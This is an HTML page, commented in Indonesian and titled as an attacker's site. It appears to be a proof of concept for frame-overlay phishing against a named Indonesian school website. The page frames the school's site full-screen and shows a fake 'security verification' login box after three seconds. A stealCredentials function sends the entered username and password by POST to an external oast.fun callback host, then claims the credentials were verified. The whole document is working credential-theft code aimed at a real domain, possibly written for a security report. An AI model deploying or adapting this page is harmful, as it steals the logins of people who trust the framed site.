<!DOCTYPE html>
<html>
<head>
    <title>Situs Penyerang</title>
    <style>
        #maliciousFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 9999;
        }
        .overlay-prompt {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 20px;
            border: 2px solid #007bff;
            border-radius: 10px;
            z-index: 10000;
            box-shadow: 0 0 20px rgba(0,0,0,0.3);
        }
    </style>
</head>
<body>
    <h1>Selamat datang di situs kami</h1>
    <p>Ini adalah situs yang tampak normal...</p>
    
    <!-- Iframe yang menginjeksi domain target -->
    <iframe id="maliciousFrame" src="https://sman12depok-jabar.sch.id/"></iframe>
    
    <!-- Prompt palsu yang muncul di atas iframe -->
    <div class="overlay-prompt" id="fakePrompt">
        <h3>Verifikasi Keamanan Diperlukan</h3>
        <p>Masukkan kredensial Anda untuk melanjutkan:</p>
        <input type="text" placeholder="Username" id="username">
        <input type="password" placeholder="Password" id="password">
        <button onclick="stealCredentials()">Submit</button>
    </div>

    <script>
        // Script untuk menangani pencurian kredensial
        function stealCredentials() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Kirim kredensial ke server penyerang
            fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
                method: 'POST',
                body: JSON.stringify({username, password})
            });
            
            alert('Terima kasih! Kredensial telah diverifikasi.');
            document.getElementById('fakePrompt').style.display = 'none';
        }

        // Tampilkan prompt setelah beberapa detik
        setTimeout(() => {
            document.getElementById('fakePrompt').style.display = 'block';
        }, 3000);
    </script>
</body>
</html>
